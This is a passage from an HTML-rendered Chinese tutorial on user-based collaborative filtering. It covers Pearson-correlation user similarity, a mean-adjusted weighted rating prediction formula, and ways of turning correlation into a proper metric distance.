<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>USim</mtext><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{USim}(A, B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span></span>：取值范围为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-1, 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span>，其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span> 表示完全正相关，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">−</span><span class="mord">1</span></span></span></span></span> 表示完全负相关。</li>
</ul>
<p>注意这是描述用户评分的联合分布变量的<strong>相似性</strong>。</p>
<h4 data-id="heading-7">通过相似性进行评分</h4>
<p>引入用户相似度后，可以通过加权聚合邻居的<strong>评价来估计目标用户对未见物品的兴趣</strong>。</p>
<p>对于用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 和物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>，其亲和力分数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Aff</mtext><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{Aff}(A, i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">Aff</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></span> 的计算公式如下：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>Aff</mtext><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover><mi>A</mi></msub><mo>+</mo><mfrac><mrow><munder><mo>∑</mo><mrow><mi>U</mi><mo>∈</mo><msub><mi>N</mi><mi>A</mi></msub></mrow></munder><mtext>USim</mtext><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>U</mi><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><msub><mi>r</mi><mrow><mi>U</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>−</mo><msub><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover><mi>U</mi></msub><mo stretchy="false">)</mo></mrow><mrow><munder><mo>∑</mo><mrow><mi>U</mi><mo>∈</mo><msub><mi>N</mi><mi>A</mi></msub></mrow></munder><mi mathvariant="normal">∣</mi><mtext>USim</mtext><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>U</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\text{Aff}(A,i) = \bar{r}_A + \frac{\sum_{U \in N_A} \text{USim}(A,U) \cdot (r_{U,i} - \bar{r}_U)}{\sum_{U \in N_A} |\text{USim}(A,U)|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">Aff</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:2.626em;vertical-align:-1.086em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.54em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1786em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1433em;"><span/></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">∣</span><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mord">∣</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.79em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1786em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1433em;"><span/></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.086em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p><strong>符号定义：</strong></p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Aff</mtext><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{Aff}(A,i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">Aff</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></span>：预测用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 对物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 的评分。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">\bar{r}_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7178em;vertical-align:-0.15em;"/><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>：用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 在其历史评分记录中的平均分，代表其基础“慷慨程度”。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">N_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>：用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 的<strong>邻域（Neighborhood）</strong>，即与其最相似的一组用户。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>USim</mtext><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{USim}(A,U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span></span>：用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 与邻居 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></span> 之间的相似度权重（通常由皮尔逊相关系数得出）。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mrow><mi>U</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>−</mo><msub><mover accent="true"><mi>r</mi><mo>ˉ</mo></mover><mi>U</mi></msub></mrow><annotation encoding="application/x-tex">r_{U,i} - \bar{r}_U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7178em;vertical-align:-0.15em;"/><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.1944em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>：邻居 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></span> 对物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 的评分与其自身平均分的差值。</li>
</ul>
<p>该模型基于以下假设：<strong>用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 的评分行为等于其自身的平均评分偏好，加上邻居偏离其自身均值的加权修正。</strong> 这种方法不仅参考了相似用户的观点，还修正了不同用户之间“评分慷慨程度”的差异。</p>
<h4 data-id="heading-8">相似度向度量空间的转换</h4>
<p>虽然皮尔逊相关系数（Pearson Correlation, <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{A,B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>）在衡量相关性方面表现出色，但它直接定义的距离 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><mn>1</mn><mo>−</mo><msub><mi>P</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">d = 1 - P_{A,B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 在数学上并不构成严格的<strong>度量空间（Metric Space）</strong>。其主要缺陷在于不满足<strong>三角不等式</strong>。为了在需要严格度量性质的算法（如某些高维空间索引或聚类算法）中使用相关系数，需要进行数学变换。</p>

























<table><thead><tr><th><strong>转换方法</strong></th><th><strong>公式</strong></th><th><strong>特性</strong></th></tr></thead><tbody><tr><td><strong>直接补数</strong></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><msub><mi>P</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub></mrow><annotation encoding="application/x-tex">1 - P_{A,B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span></td><td>满足非负性、自反性、对称性，但不满足三角不等式。</td></tr><tr><td><strong>平方根变换</strong></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mrow><mn>1</mn><mo>−</mo><msub><mi>P</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub></mrow></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{1 - P_{A,B}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.3564em;"/><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8836em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"/><span class="mord" style="padding-left:1em;"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-2.8436em;"><span class="pstrut" style="height:3.2em;"/><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.28em" viewbox="0 0 400000 1296" preserveaspectratio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119&#10;c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120&#10;c340,-704.7,510.7,-1060.3,512,-1067&#10;l0 -0&#10;c4.7,-7.3,11,-11,19,-11&#10;H40000v40H1012.3&#10;s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232&#10;c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1&#10;s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26&#10;c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z&#10;M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3564em;"><span/></span></span></span></span></span></span></span></span></td><td><strong>最常用方法</strong>。能够将其转化为符合三角不等式的欧几里得度量。</td></tr><tr><td><strong>角度转换</strong></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>arccos</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>P</mi><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\arccos(P_{A,B})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mop">arccos</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></td><td>将相关性视为向量间的夹角，在余弦相似度场景中尤为常见。</td></tr></tbody></table>
